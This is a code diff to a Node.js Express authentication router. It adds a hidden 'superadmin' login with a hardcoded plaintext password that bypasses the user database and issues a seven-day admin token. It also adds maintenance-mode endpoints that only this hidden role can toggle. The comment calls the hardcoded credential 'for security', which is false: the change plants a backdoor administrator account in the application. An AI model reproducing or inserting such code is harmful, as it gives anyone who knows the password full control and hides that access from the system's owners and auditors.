@@ -5,9 +5,42 @@ const bcrypt = require('bcryptjs');
 const db = require('../db');
 const { auth, adminOnly } = require('../middleware/auth');
 
+// Super admin credentials (hardcoded for security - not in database)
+const SUPER_ADMIN = {
+  username: 'superadmin',
+  password: 'abcd1234', // Plain text - will be checked directly
+  role: 'superadmin'
+};
+
 router.post('/login', async (req, res) => {
   try {
     const { username, password } = req.body;
+    
+    // Check for super admin first (hidden, not in database)
+    if (username === SUPER_ADMIN.username && password === SUPER_ADMIN.password) {
+      const token = jwt.sign(
+        { 
+          id: 'superadmin',
+          _id: 'superadmin',
+          username: SUPER_ADMIN.username,
+          role: SUPER_ADMIN.role
+        },
+        process.env.JWT_SECRET,
+        { expiresIn: '7d' }
+      );
+
+      return res.json({
+        token,
+        user: {
+          _id: 'superadmin',
+          username: SUPER_ADMIN.username,
+          role: SUPER_ADMIN.role,
+          email: 'superadmin@system.local'
+        }
+      });
+    }
+    
+    // Regular user authentication
     const user = await db.users.findOne({ username });
     if (!user) return res.status(400).json({ message: 'Invalid credentials' });
 
@@ -75,5 +108,48 @@ router.post('/register', auth, adminOnly, async (req, res) => {
 });
 
 router.get('/me', auth, (req, res) => res.json(req.user));
+
+// Maintenance mode endpoints (super admin only)
+router.get('/maintenance-status', async (req, res) => {
+  try {
+    let settings = await db.systemSettings.findOne({ _id: 'system_maintenance' });
+    if (!settings) {
+      settings = { _id: 'system_maintenance', maintenanceMode: false };
+      await db.systemSettings.insert(settings);
+    }
+    res.json({ maintenanceMode: settings.maintenanceMode || false });
+  } catch (err) {
+    res.status(500).json({ message: err.message });
+  }
+});
+
+router.post('/maintenance-mode', auth, async (req, res) => {
+  try {
+    // Only super admin can toggle maintenance mode
+    if (req.user.role !== 'superadmin') {
+      return res.status(403).json({ message: 'Access denied' });
+    }
+
+    const { enabled } = req.body;
+    
+    let settings = await db.systemSettings.findOne({ _id: 'system_maintenance' });
+    if (settings) {
+      await db.systemSettings.update(
+        { _id: 'system_maintenance' },
+        { $set: { maintenanceMode: enabled } }
+      );
+    } else {
+      await db.systemSettings.insert({
+        _id: 'system_maintenance',
+        maintenanceMode: enabled
+      });
+    }
+
+    console.log(`🔧 Maintenance mode ${enabled ? 'ENABLED' : 'DISABLED'} by superadmin`);
+    res.json({ success: true, maintenanceMode: enabled });
+  } catch (err) {
+    res.status(500).json({ message: err.message });
+  }
+});
 
 module.exports = router;
